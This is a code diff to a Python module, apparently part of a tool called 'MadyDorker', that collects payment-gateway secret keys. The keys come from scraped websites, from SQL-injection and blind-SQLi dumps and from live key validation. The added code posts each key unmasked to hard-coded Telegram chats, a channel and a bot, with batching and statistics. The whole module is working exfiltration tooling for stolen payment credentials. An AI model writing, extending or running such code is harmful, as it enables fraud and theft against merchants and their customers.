@@ -1,13 +1,15 @@
 """
 Mady Bot Auto-Feed Integration
 
-Automatically feeds found gateway keys to Mady bot's scraped_keys.json
-for immediate testing and validation.
+Automatically feeds found gateway keys to:
+  1. Mady bot's scraped_keys.json on disk
+  2. Telegram rich messages → your chat, group, channel, AND Mady Bot
 """
 
 import os
 import json
 import asyncio
+import aiohttp
 from datetime import datetime
 from typing import Dict, List, Optional
 from dataclasses import dataclass, field
@@ -21,12 +23,27 @@ class MadyFeederConfig:
     enabled: bool = True
     mady_path: str = "/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0"
     scraped_keys_file: str = "scraped_keys.json"
-    auto_test: bool = False  # Auto-trigger gateway test after feeding
-    deduplicate: bool = True  # Skip already-fed keys
+    auto_test: bool = False
+    deduplicate: bool = True
+    
+    # ===== Telegram Rich Message Feeds =====
+    telegram_enabled: bool = True
+    bot_token: str = ""  # Filled from main config at init
+    # All targets that receive rich messages (chat_id list)
+    feed_chat_ids: List[str] = field(default_factory=list)  # Built at init
+    # Explicit additional targets
+    mady_bot_chat_id: str = "8385066318"        # Mady Bot direct
+    feed_channel_id: str = "-1003720958643"     # Dedicated channel
+    # Message formatting
+    show_full_key: bool = True   # Show full key value (not masked)
 
 
 class MadyFeeder:
-    """Feeds gateway keys to Mady bot for testing.
+    """Feeds gateway keys to Mady bot — disk + Telegram rich messages.
+    
+    Sends to ALL configured targets simultaneously:
+      - Disk: scraped_keys.json
+      - Telegram: your chat, your group, a channel, Mady Bot
     
     XDumpGO-complete support for 50+ gateway types!
     """
@@ -225,6 +242,23 @@ class MadyFeeder:
         'instamojo', 'paytm', 'phonepe',
     ]
     
+    # Emoji map for gateway families
+    GATEWAY_EMOJI = {
+        'stripe': '💳', 'braintree': '🌳', 'paypal': '🅿️',
+        'square': '⬜', 'adyen': '🔷', 'razorpay': '⚡',
+        'mollie': '🐟', 'klarna': '🩷', 'affirm': '✅',
+        'afterpay': '🟢', 'sezzle': '🟣', 'authnet': '🏦',
+        'checkout': '🛒', 'worldpay': '🌍', 'nmi': '🔑',
+        '2checkout': '2️⃣', 'payu': '💰', 'cybersource': '🛡️',
+        'firstdata': '1️⃣', 'globalpay': '🌐', 'paysafe': '🔒',
+        'skrill': '💸', 'gocardless': '💚', 'recurly': '🔄',
+        'chargebee': '🐝', 'paddle': '🏓', 'gumroad': '🛣️',
+        'lemonsqueezy': '🍋', 'fastspring': '🌊', 'bluesnap': '🔵',
+        'spreedly': '🔀', 'plaid': '🏛️', 'wepay': '💲',
+        'dwolla': '🏧', 'instamojo': '🇮🇳', 'paytm': '📱',
+        'phonepe': '☎️',
+    }
+    
     def __init__(self, config: Optional[MadyFeederConfig] = None):
         self.config = config or MadyFeederConfig()
         self.scraped_keys_path = os.path.join(
@@ -232,6 +266,8 @@ class MadyFeeder:
             self.config.scraped_keys_file
         )
         self._fed_keys: set = set()  # Track what we've already fed
+        self._telegram_sent: int = 0  # Count of telegram messages sent
+        self._disk_saved: int = 0     # Count of disk saves
         self._load_existing_keys()
     
     def _load_existing_keys(self):
@@ -260,15 +296,210 @@ class MadyFeeder:
         normalized = self._normalize_key_type(key_type)
         return any(s in normalized for s in self.SUPPORTED_GATEWAYS)
     
+    def _get_gateway_emoji(self, key_type: str) -> str:
+        """Get emoji for a gateway type."""
+        normalized = self._normalize_key_type(key_type).lower()
+        for family, emoji in self.GATEWAY_EMOJI.items():
+            if family in normalized:
+                return emoji
+        return '🔐'
+    
+    def _build_rich_message(self, url: str, key_type: str, key_value: str,
+                            source: str = "", extra: Optional[Dict] = None) -> str:
+        """Build a rich HTML-formatted Telegram message for a found key.
+        
+        Returns:
+            HTML-formatted message string
+        """
+        normalized = self._normalize_key_type(key_type)
+        emoji = self._get_gateway_emoji(key_type)
+        gateway_family = normalized.split('_')[0].upper()
+        
+        # Key display
+        if self.config.show_full_key:
+            key_display = f"<code>{key_value}</code>"
+        else:
+            # Mask middle portion
+            if len(key_value) > 16:
+                key_display = f"<code>{key_value[:8]}{'•' * 8}{key_value[-8:]}</code>"
+            else:
+                key_display = f"<code>{key_value[:4]}{'•' * 4}{key_value[-4:]}</code>"
+        
+        # Extract domain from URL
+        try:
+            from urllib.parse import urlparse
+            domain = urlparse(url).netloc or url[:60]
+        except Exception:
+            domain = url[:60]
+        
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        lines = [
+            f"{emoji} <b>GATEWAY KEY FOUND</b> {emoji}",
+            "",
+            f"🏷 <b>Type:</b> <code>{normalized}</code>",
+            f"🏢 <b>Gateway:</b> {gateway_family}",
+            f"🌐 <b>Domain:</b> <code>{domain}</code>",
+            f"🔗 <b>URL:</b> {url[:200]}",
+            "",
+            f"🔑 <b>Key:</b>",
+            f"{key_display}",
+            "",
+        ]
+        
+        # Add source info if available
+        if source:
+            source_labels = {
+                'gateway_secrets': '🕸 Page Scrape (Gateway)',
+                'api_secrets': '🔍 API Secret Detection',
+                'js_bundle': '📦 JS Bundle Analysis',
+                'auto_dump_gateway': '💾 Auto-Dump (Gateway)',
+                'auto_dump_valid': '✅ Auto-Dump (Validated)',
+                'key_validation': '🧪 Live Key Validation',
+                'scan_sqli_dump': '💉 SQLi Dump',
+                'scan_blind_dump': '🔮 Blind SQLi Dump',
+                'scan_gateway_report': '📊 Scan Report (Gateway)',
+                'scan_non_gateway': '🔎 Scan Report (API)',
+                'madydorker': '🤖 MadyDorker Auto',
+            }
+            label = source_labels.get(source, f'📡 {source}')
+            lines.append(f"📡 <b>Source:</b> {label}")
+        
+        # Add extra metadata
+        if extra:
+            if 'confidence' in extra:
+                conf = extra['confidence']
+                conf_bar = '🟢' if conf >= 0.9 else '🟡' if conf >= 0.7 else '🟠'
+                lines.append(f"{conf_bar} <b>Confidence:</b> {conf:.0%}")
+            if 'waf' in extra:
+                lines.append(f"🛡 <b>WAF:</b> {extra['waf']}")
+        
+        lines.extend([
+            "",
+            f"⏰ {timestamp}",
+            f"━━━━━━━━━━━━━━━━━━━━",
+            f"🤖 <b>MadyDorker Auto-Feed</b>",
+        ])
+        
+        return "\n".join(lines)
+    
+    def _build_batch_message(self, url: str, keys: List[Dict]) -> str:
+        """Build a rich message for multiple keys from the same URL."""
+        try:
+            from urllib.parse import urlparse
+            domain = urlparse(url).netloc or url[:60]
+        except Exception:
+            domain = url[:60]
+        
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        lines = [
+            f"🎯 <b>MULTIPLE KEYS FOUND</b> 🎯",
+            "",
+            f"🌐 <b>Domain:</b> <code>{domain}</code>",
+            f"🔗 <b>URL:</b> {url[:200]}",
+            f"📊 <b>Keys Found:</b> {len(keys)}",
+            "",
+        ]
+        
+        for i, k in enumerate(keys, 1):
+            kt = k.get('type', 'unknown')
+            kv = k.get('value', '')
+            emoji = self._get_gateway_emoji(kt)
+            normalized = self._normalize_key_type(kt)
+            if self.config.show_full_key:
+                key_display = kv
+            else:
+                key_display = f"{kv[:8]}...{kv[-6:]}" if len(kv) > 16 else kv
+            lines.append(f"  {emoji} <b>{i}.</b> <code>{normalized}</code>")
+            lines.append(f"     <code>{key_display}</code>")
+            lines.append("")
+        
+        lines.extend([
+            f"⏰ {timestamp}",
+            f"━━━━━━━━━━━━━━━━━━━━",
+            f"🤖 <b>MadyDorker Auto-Feed</b>",
+        ])
+        
+        return "\n".join(lines)
+    
+    async def _send_telegram(self, text: str) -> int:
+        """Send rich message to ALL configured Telegram targets.
+        
+        Returns:
+            Number of targets successfully notified
+        """
+        if not self.config.telegram_enabled or not self.config.bot_token:
+            return 0
+        
+        # Collect all unique target chat IDs
+        targets = set()
+        for cid in self.config.feed_chat_ids:
+            if cid:
+                targets.add(str(cid))
+        if self.config.mady_bot_chat_id:
+            targets.add(str(self.config.mady_bot_chat_id))
+        if self.config.feed_channel_id:
+            targets.add(str(self.config.feed_channel_id))
+        
+        if not targets:
+            logger.debug("No Telegram feed targets configured")
+            return 0
+        
+        api_url = f"https://api.telegram.org/bot{self.config.bot_token}/sendMessage"
+        sent = 0
+        
+        try:
+            timeout = aiohttp.ClientTimeout(total=15)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                for chat_id in targets:
+                    try:
+                        data = {
+                            "chat_id": chat_id,
+                            "text": text[:4096],  # Telegram limit
+                            "parse_mode": "HTML",
+                            "disable_web_page_preview": True,
+                        }
+                        async with session.post(api_url, json=data) as resp:
+                            if resp.status == 200:
+                                sent += 1
+                                logger.debug(f"Mady feed sent to {chat_id}")
+                            else:
+                                err = await resp.text()
+                                logger.warning(f"Mady feed failed for {chat_id}: {resp.status} - {err[:100]}")
+                    except Exception as e:
+                        logger.warning(f"Mady feed error for {chat_id}: {e}")
+        except Exception as e:
+            logger.error(f"Mady feed Telegram session error: {e}")
+        
+        self._telegram_sent += sent
+        return sent
+    
+    def _send_telegram_sync(self, text: str) -> int:
+        """Sync wrapper for _send_telegram — works from any context."""
+        try:
+            loop = asyncio.get_running_loop()
+            # We're inside an async context — schedule it
+            asyncio.ensure_future(self._send_telegram(text))
+            return 1  # Optimistic — fire-and-forget
+        except RuntimeError:
+            # No running loop — create one
+            try:
+                return asyncio.run(self._send_telegram(text))
+            except Exception as e:
+                logger.error(f"Mady feed sync send failed: {e}")
+                return 0
+    
     def feed_gateway(self, url: str, key_type: str, key_value: str, 
-                     extra: Optional[Dict] = None) -> bool:
-        """Feed a single gateway key to Mady bot.
+                     extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
+        """Feed a single gateway key to Mady bot — disk + Telegram.
         
         Args:
             url: Source URL where key was found
             key_type: Type of gateway key
             key_value: The actual key value
             extra: Optional additional metadata
+            source: Discovery source label
             
         Returns:
             True if successfully fed, False otherwise
@@ -287,18 +518,17 @@ class MadyFeeder:
         
         normalized_type = self._normalize_key_type(key_type)
         
+        # ===== 1. Save to disk =====
+        disk_ok = False
         try:
-            # Load existing keys
             existing = []
             if os.path.exists(self.scraped_keys_path):
                 with open(self.scraped_keys_path, 'r') as f:
                     existing = json.load(f)
             
-            # Check if URL already has entry
             found_url = False
             for entry in existing:
                 if entry.get('url') == url:
-                    # Add key to existing entry
                     key_found = False
                     for kt, keys in entry.get('keys', []):
                         if kt == normalized_type:
@@ -311,47 +541,134 @@ class MadyFeeder:
                     found_url = True
                     break
             
-            # Create new entry if URL not found
             if not found_url:
                 new_entry = {
                     "url": url,
                     "keys": [[normalized_type, [key_value]]],
-                    "source": "madydorker",
+                    "source": source,
                     "timestamp": datetime.now().isoformat(),
                 }
                 if extra:
                     new_entry['extra'] = extra
                 existing.append(new_entry)
             
-            # Write back
             with open(self.scraped_keys_path, 'w') as f:
                 json.dump(existing, f, indent=2)
             
-            self._fed_keys.add(key_value)
-            logger.info(f"Fed gateway to Mady: {normalized_type} from {url[:50]}")
-            return True
-            
+            disk_ok = True
+            self._disk_saved += 1
+            logger.info(f"💾 Fed to disk: {normalized_type} from {url[:50]}")
         except Exception as e:
-            logger.error(f"Failed to feed key to Mady: {e}")
-            return False
-    
-    def feed_batch(self, gateways: List[Dict]) -> int:
-        """Feed multiple gateways to Mady bot.
+            logger.error(f"Failed to save key to disk: {e}")
         
-        Args:
-            gateways: List of gateway dicts with url, type, value keys
+        # ===== 2. Send Telegram rich message =====
+        try:
+            msg = self._build_rich_message(url, key_type, key_value, source, extra)
+            self._send_telegram_sync(msg)
+        except Exception as e:
+            logger.error(f"Failed to send Telegram feed: {e}")
+        
+        self._fed_keys.add(key_value)
+        return disk_ok
+    
+    async def feed_gateway_async(self, url: str, key_type: str, key_value: str,
+                                  extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
+        """Async version of feed_gateway — use from async contexts for proper awaiting."""
+        if not self.config.enabled:
+            return False
+        
+        if not self._is_supported_gateway(key_type):
+            return False
+        
+        if key_value in self._fed_keys:
+            return False
+        
+        normalized_type = self._normalize_key_type(key_type)
+        
+        # 1. Disk save (sync I/O is fine for small JSON)
+        disk_ok = False
+        try:
+            existing = []
+            if os.path.exists(self.scraped_keys_path):
+                with open(self.scraped_keys_path, 'r') as f:
+                    existing = json.load(f)
             
-        Returns:
-            Number of gateways successfully fed
+            found_url = False
+            for entry in existing:
+                if entry.get('url') == url:
+                    key_found = False
+                    for kt, keys in entry.get('keys', []):
+                        if kt == normalized_type:
+                            if key_value not in keys:
+                                keys.append(key_value)
+                            key_found = True
+                            break
+                    if not key_found:
+                        entry.setdefault('keys', []).append([normalized_type, [key_value]])
+                    found_url = True
+                    break
+            
+            if not found_url:
+                new_entry = {
+                    "url": url,
+                    "keys": [[normalized_type, [key_value]]],
+                    "source": source,
+                    "timestamp": datetime.now().isoformat(),
+                }
+                if extra:
+                    new_entry['extra'] = extra
+                existing.append(new_entry)
+            
+            with open(self.scraped_keys_path, 'w') as f:
+                json.dump(existing, f, indent=2)
+            
+            disk_ok = True
+            self._disk_saved += 1
+        except Exception as e:
+            logger.error(f"Disk save failed: {e}")
+        
+        # 2. Telegram rich message (properly awaited)
+        try:
+            msg = self._build_rich_message(url, key_type, key_value, source, extra)
+            await self._send_telegram(msg)
+        except Exception as e:
+            logger.error(f"Telegram feed failed: {e}")
+        
+        self._fed_keys.add(key_value)
+        return disk_ok
+    
+    def feed_batch(self, gateways: List[Dict], source: str = "madydorker") -> int:
+        """Feed multiple gateways to Mady bot — disk + Telegram.
+        
+        If multiple keys from same URL, sends a consolidated batch message.
         """
         fed_count = 0
+        
+        # Group by URL for batch messages
+        url_groups: Dict[str, List[Dict]] = {}
         for gw in gateways:
             url = gw.get('url', '')
             key_type = gw.get('type', '')
             key_value = gw.get('value', '')
             if url and key_type and key_value:
-                if self.feed_gateway(url, key_type, key_value):
+                url_groups.setdefault(url, []).append(gw)
+        
+        for url, keys in url_groups.items():
+            # Feed each key individually to disk
+            batch_new = []
+            for gw in keys:
+                if self.feed_gateway(url, gw['type'], gw['value'], source=source):
                     fed_count += 1
+                    batch_new.append(gw)
+            
+            # If 3+ new keys from same URL, also send consolidated batch message
+            if len(batch_new) >= 3:
+                try:
+                    msg = self._build_batch_message(url, batch_new)
+                    self._send_telegram_sync(msg)
+                except Exception:
+                    pass
+        
         return fed_count
     
     def get_stats(self) -> Dict:
@@ -365,10 +682,23 @@ class MadyFeeder:
         except:
             pass
         
+        targets = set()
+        for cid in self.config.feed_chat_ids:
+            if cid:
+                targets.add(str(cid))
+        if self.config.mady_bot_chat_id:
+            targets.add(self.config.mady_bot_chat_id)
+        if self.config.feed_channel_id:
+            targets.add(self.config.feed_channel_id)
+        
         return {
             "enabled": self.config.enabled,
+            "telegram_enabled": self.config.telegram_enabled,
             "mady_path": self.config.mady_path,
+            "telegram_targets": len(targets),
             "keys_fed_this_session": len(self._fed_keys),
+            "telegram_messages_sent": self._telegram_sent,
+            "disk_saves": self._disk_saved,
             "total_entries_in_mady": total_in_mady,
         }
 
@@ -385,6 +715,13 @@ def get_feeder(config: Optional[MadyFeederConfig] = None) -> MadyFeeder:
     return _feeder
 
 
-def feed_to_mady(url: str, key_type: str, key_value: str, extra: Optional[Dict] = None) -> bool:
-    """Convenience function to feed a gateway to Mady bot."""
-    return get_feeder().feed_gateway(url, key_type, key_value, extra)
+def feed_to_mady(url: str, key_type: str, key_value: str, 
+                 extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
+    """Convenience function to feed a gateway to Mady bot (disk + Telegram)."""
+    return get_feeder().feed_gateway(url, key_type, key_value, extra, source)
+
+
+async def feed_to_mady_async(url: str, key_type: str, key_value: str,
+                              extra: Optional[Dict] = None, source: str = "madydorker") -> bool:
+    """Async convenience function — properly awaits Telegram sends."""
+    return await get_feeder().feed_gateway_async(url, key_type, key_value, extra, source)
